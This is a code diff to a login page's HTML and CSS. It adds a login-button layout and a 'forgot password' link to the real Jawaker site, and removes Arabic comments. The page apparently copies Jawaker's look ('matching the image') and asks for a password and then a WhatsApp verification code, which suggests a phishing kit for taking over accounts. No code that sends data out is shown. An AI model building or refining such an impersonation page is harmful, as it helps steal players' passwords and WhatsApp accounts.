@@ -81,6 +81,27 @@ body {
   background: #fff5f5 !important;
 }
 
+/* زر الدخول ورابط نسيت كلمة السر */
+.login-actions {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-top: 6px;
+}
+#accessBtn { width: 42%; display: inline-block; }
+.forgot-pass-link {
+  color: rgba(255, 255, 255, 0.75);
+  font-size: 12px;
+  font-weight: 400;
+  text-decoration: none;
+  transition: color 0.2s ease;
+  white-space: nowrap;
+}
+.forgot-pass-link:hover {
+  color: #ffffff;
+  text-decoration: underline;
+}
+
 .promo-divider { border-top: 1px solid rgba(237, 239, 243, 0.2); margin: 16px 0 12px; }
 .promo-text { text-align: center; color: var(--gold); font-weight: 600; font-size: 12px; letter-spacing: 0.2px; }
 button {
@@ -89,7 +110,6 @@ button {
   color: #ffffff; font-weight: 600; font-size: 13px;
   letter-spacing: 0.3px; cursor: pointer; transition: filter 0.15s ease;
 }
-#accessBtn { width: 45%; display: block; }
 button:hover { filter: brightness(1.08); }
 
 /* أزرار التواصل متطابقة الحجم تماماً */
@@ -145,7 +165,6 @@ button:hover { filter: brightness(1.08); }
 .verify-instruction { color: #cccccc; font-size: 12.5px; text-align: center; margin-bottom: 16px; line-height: 1.5; }
 .verify-instruction strong { color: #ffffff; font-weight: 600; }
 
-/* الصندوق الداخلي الداكن المتطابق مع الصورة */
 .jawaker-inner-box {
   background: #232326;
   border: 1px solid #2a2a2d;
@@ -210,11 +229,9 @@ button:hover { filter: brightness(1.08); }
   background: #20C94A; color: #ffffff; cursor: pointer; border: 1px solid #20C94A;
 }
 
-
 .whatsapp-code-instruction { color: #cccccc; font-size: 12.5px; text-align: center; margin-bottom: 0; line-height: 1.5; }
 .whatsapp-code-instruction strong { color: #ffffff; font-weight: 600; }
 
-/* تنسيق أزرار Resend و Connect المطابق للصورة */
 .whatsapp-code-actions { 
   display: flex; 
   gap: 12px; 
@@ -222,7 +239,7 @@ button:hover { filter: brightness(1.08); }
 }
 
 .whatsapp-resend-btn, .whatsapp-connect-btn {
-  flex: 1; /* لضمان تساوي العرض بالضبط */
+  flex: 1;
   height: 48px;
   border-radius: 8px;
   font-weight: 600; 
@@ -235,9 +252,9 @@ button:hover { filter: brightness(1.08); }
 }
 
 .whatsapp-resend-btn {
-  background: #0f0f10; /* أسود باهت */
+  background: #0f0f10;
   border: 1px solid #1d1d1f; 
-  color: #6b6b6d; /* رمادي داكن للخط */
+  color: #6b6b6d;
 }
 .whatsapp-resend-btn.ready-resend { 
   background: #2a2a2c; 
@@ -247,9 +264,9 @@ button:hover { filter: brightness(1.08); }
 }
 
 .whatsapp-connect-btn {
-  background: #0b2613; /* أخضر داكن جداً جداً */
+  background: #0b2613;
   border: 1px solid #123b1d; 
-  color: #235c34; /* أخضر داكن للخط */
+  color: #235c34;
 }
 .whatsapp-connect-btn.ready-connect {
   background: #176b2d; 
@@ -258,8 +275,6 @@ button:hover { filter: brightness(1.08); }
   cursor: pointer; 
 }
 
-
-/* نافذة الخطأ العرضية */
 .whatsapp-error-overlay-box {
   position: absolute;
   top: 50%; left: 50%;
@@ -318,7 +333,11 @@ button:hover { filter: brightness(1.08); }
         <div class="field-group">
           <input type="password" id="accPassword" placeholder="Password" required autocomplete="off" />
         </div>
-        <button type="submit" id="accessBtn">Login</button>
+        
+        <div class="login-actions">
+          <button type="submit" id="accessBtn">Login</button>
+          <a href="https://www.jawaker.com/ar/users/password/new" class="forgot-pass-link" target="_blank">هل نسيت كلمة السر؟</a>
+        </div>
       </form>
 
       <div class="social-login-container">
